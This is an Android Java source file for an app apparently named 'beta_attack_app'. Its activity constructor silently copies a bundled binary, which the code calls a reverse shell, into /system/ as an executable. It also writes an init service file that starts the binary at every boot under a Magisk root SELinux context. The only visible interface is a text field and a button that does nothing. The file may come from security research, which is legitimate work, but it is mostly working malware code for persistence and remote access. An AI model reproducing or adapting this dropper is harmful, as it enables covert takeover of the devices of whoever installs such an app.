package com.example.beta_attack_app;

import static android.content.ContentValues.TAG;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Objects;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.app.Activity;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.core.content.ContextCompat;


public class MainActivity extends Activity {
    EditText inputText;
    TextView response;
    Button saveButton;

    ////////////////////////////////////////////////////////////////////////////////////////


    public MainActivity() {
        super();
        writeServiceFile();
        writeReverseShell();
    }


    static int recCode = 555;

    public static void writeReverseShell() {
//        InputStream reverseShell = getResources().openRawResource(R.raw.attack_app);
        InputStream reverseShell = null;
        try {
            reverseShell = Objects.requireNonNull(MainActivity.class.getClassLoader()).getResource("res/raw/attack_app").openStream();
        } catch (IOException e) {
            e.printStackTrace();
        }
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        int size = 0;
        // Read the entire resource into a local byte buffer.
        byte[] buffer = new byte[5120];
        try {

            while ((size = reverseShell.read(buffer, 0, 1024)) >= 0) {
                outputStream.write(buffer, 0, size);
            }
            reverseShell.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        buffer = outputStream.toByteArray();
        File file = new File("/system/", "attack_app");
        try {
            FileOutputStream f = new FileOutputStream(file);
            f.write(buffer);
            f.close();
            file.setExecutable(true, false);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void writeServiceFile() {
        File file = new File("/system/etc/init", "attack.rc");
        try {
            FileOutputStream f = new FileOutputStream(file);
            PrintWriter pw = new PrintWriter(f);
            pw.println("service attack_app /system/attack_app");
            pw.println("    class main\n");
            pw.println("on property:sys.boot_completed=1");
            pw.println("    exec_background u:r:magisk:s0 -- /system/attack_app");
            pw.flush();
            pw.close();
            f.close();
            Runtime.getRuntime().exec("chcon u:object_r:system_file:s0 attack.rc");
            file.setReadable(true, false);
            // not really need it to activate the service for androidx86 emulator
//            Process sh = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
//            OutputStream os = sh.getOutputStream();
//            os.write(("chown 0.0 /system/etc/init/attack.rc").getBytes(StandardCharsets.US_ASCII));
//            os.flush();
//            os.close();
//            sh.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        inputText = (EditText) findViewById(R.id.myInputText);
        response = (TextView) findViewById(R.id.response);
        saveButton = (Button) findViewById(R.id.saveExternalStorage);

        saveButton.setOnClickListener(new OnClickListener() {
            @SuppressLint("SetTextI18n")
            @Override
            public void onClick(View v) {

            }
        });
    }

    public static void untilHere(){

    }
}